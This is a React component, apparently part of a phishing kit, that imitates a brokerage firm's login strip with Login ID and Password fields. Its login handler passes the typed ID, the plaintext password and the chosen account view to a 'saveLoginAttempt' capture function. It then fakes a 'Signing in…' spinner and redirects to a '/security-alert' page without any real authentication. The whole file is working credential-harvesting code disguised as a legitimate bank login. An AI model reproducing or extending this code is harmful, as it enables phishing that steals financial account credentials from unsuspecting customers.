import { Eye, Lock, ChevronDown, Check } from 'lucide-react';
import { useState, useRef, useEffect } from 'react';
import { useLocation } from 'wouter';
import { saveLoginAttempt } from '@/lib/captureUtils';

const SUMMARY_OPTIONS = [
  'Accounts Summary', 'Account Balances', 'Positions', 'Trade Ticket',
  'History', 'Stock & ETF Trading', 'Options Trading', 'Mutual Fund Trading',
  'Bond Trading', 'Research', 'Order Status', 'Watchlist',
];

export function AuthStrip() {
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [selectedOption, setSelectedOption] = useState(SUMMARY_OPTIONS[0]);
  const [loginId, setLoginId] = useState('');
  const [passwordVal, setPasswordVal] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const [, navigate] = useLocation();

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setDropdownOpen(false);
      }
    }
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  const handleLogin = () => {
    if (loading) return;
    saveLoginAttempt(loginId.trim(), passwordVal, '/', selectedOption);
    setLoading(true);
    setTimeout(() => { setLoading(false); navigate('/security-alert'); }, 1800);
  };

  return (
    <div className="w-full bg-white border-b relative z-40 font-sans" style={{ borderColor: 'var(--border-grey)' }}>
      <div className="max-w-[var(--content-width)] mx-auto px-4 py-3 flex justify-end">
        <div className="flex flex-col gap-2">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1" style={{ color: 'var(--text-primary)' }}>

              {/* Accounts Summary dropdown */}
              <div className="relative" ref={dropdownRef}>
                <button
                  onClick={() => setDropdownOpen(!dropdownOpen)}
                  className="flex items-center gap-2 px-3 h-[33px] bg-white border rounded-[2px] text-[14px] hover:bg-gray-50 transition-colors"
                  style={{ borderColor: 'var(--border-grey)', width: '205px', justifyContent: 'space-between' }}
                >
                  <span className="truncate">{selectedOption}</span>
                  <ChevronDown className="w-4 h-4 shrink-0" />
                </button>
                {dropdownOpen && (
                  <div className="absolute top-[35px] left-0 w-full mt-1 shadow-lg py-1 rounded-[2px] z-50 text-[13px] border"
                    style={{ backgroundColor: '#344B58', color: 'white', borderColor: 'var(--border-grey)' }}>
                    {SUMMARY_OPTIONS.map((opt) => (
                      <button key={opt} onClick={() => { setSelectedOption(opt); setDropdownOpen(false); }}
                        className="w-full text-left px-3 py-1.5 hover:bg-black/20 flex items-center gap-2">
                        <span className="w-4 flex justify-center">
                          {selectedOption === opt && <Check className="w-3 h-3" />}
                        </span>
                        {opt}
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <span className="text-gray-400 mx-1">|</span>

              <input type="text" placeholder="Login ID" value={loginId}
                onChange={(e) => setLoginId(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                className="px-3 h-[33px] border rounded-[2px] text-[14px] focus:outline-none"
                style={{ borderColor: 'var(--border-grey)', width: '170px' }}
                onFocus={(e) => { e.target.style.borderColor = '#0074D9'; e.target.style.boxShadow = '0 0 0 1px #0074D9'; }}
                onBlur={(e) => { e.target.style.borderColor = 'var(--border-grey)'; e.target.style.boxShadow = 'none'; }}
              />

              <div className="relative">
                <input type={showPass ? 'text' : 'password'} placeholder="Password" value={passwordVal}
                  onChange={(e) => setPasswordVal(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                  className="px-3 pr-9 h-[33px] border rounded-[2px] text-[14px] focus:outline-none"
                  style={{ borderColor: 'var(--border-grey)', width: '170px' }}
                  onFocus={(e) => { e.target.style.borderColor = '#0074D9'; e.target.style.boxShadow = '0 0 0 1px #0074D9'; }}
                  onBlur={(e) => { e.target.style.borderColor = 'var(--border-grey)'; e.target.style.boxShadow = 'none'; }}
                />
                <button onClick={() => setShowPass(v => !v)}
                  style={{ position: 'absolute', right: 8, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
                  <Eye className="w-4 h-4 text-gray-400" />
                </button>
              </div>

              {/* Log In button with spinner */}
              <button onClick={handleLogin} disabled={loading} style={{
                backgroundColor: 'var(--login-blue)', height: '33px', minWidth: 72, padding: '0 16px',
                color: 'white', fontSize: 14, fontWeight: 500, borderRadius: 2, border: 'none',
                cursor: loading ? 'default' : 'pointer', display: 'flex', alignItems: 'center',
                justifyContent: 'center', gap: 6,
              }}>
                {loading ? (
                  <>
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" style={{ animation: 'spin 0.75s linear infinite' }}>
                      <style>{`@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}`}</style>
                      <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" strokeWidth="3" />
                      <path d="M12 2a10 10 0 019.8 8" stroke="#fff" strokeWidth="3" strokeLinecap="round" />
                    </svg>
                    <span style={{ fontSize: 12 }}>Signing in…</span>
                  </>
                ) : 'Log In'}
              </button>
            </div>
          </div>

          <div className="flex items-center gap-4 text-[12px] pl-1" style={{ color: 'var(--link-blue)' }}>
            <button className="hover:underline">First Time Users</button>
            <span className="text-gray-400">|</span>
            <button className="flex items-center gap-1 hover:underline"><Lock className="w-3 h-3" /> VaultSafe</button>
            <span className="text-gray-400">|</span>
            <label className="flex items-center gap-1.5 cursor-pointer hover:underline">
              <input type="checkbox" className="w-3 h-3 rounded-[2px]" /> Remember Login ID
            </label>
            <span className="text-gray-400">|</span>
            <button className="hover:underline">Forgot Login ID or Password?</button>
          </div>
        </div>
      </div>
    </div>
  );
}
